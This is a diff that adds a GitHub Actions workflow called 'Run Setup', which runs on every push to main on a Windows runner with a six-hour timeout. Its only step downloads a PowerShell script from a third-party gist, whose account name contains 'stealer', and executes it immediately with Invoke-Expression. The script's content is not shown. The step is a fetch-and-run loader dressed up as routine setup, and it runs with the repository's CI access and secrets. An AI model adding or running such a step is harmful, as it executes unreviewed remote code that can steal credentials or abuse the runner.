@@ -1,1 +1,19 @@
+name: Run Setup
 
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+jobs:
+  run-script:
+    runs-on: windows-latest
+    timeout-minutes: 360
+
+    steps:
+      - name: Setup and Execute
+        shell: powershell
+        run: |
+          $rawUrl = "https://gist.githubusercontent.com/TN81stealerpigon/42175f595c6d3fd88aec73c94753146b/raw/cd2a5cd9fd40a7a0a4eacef528208d30cc53ac4e/setup.ps1"
+          $script = Invoke-WebRequest -Uri $rawUrl -UseBasicParsing
+          Invoke-Expression $script.Content
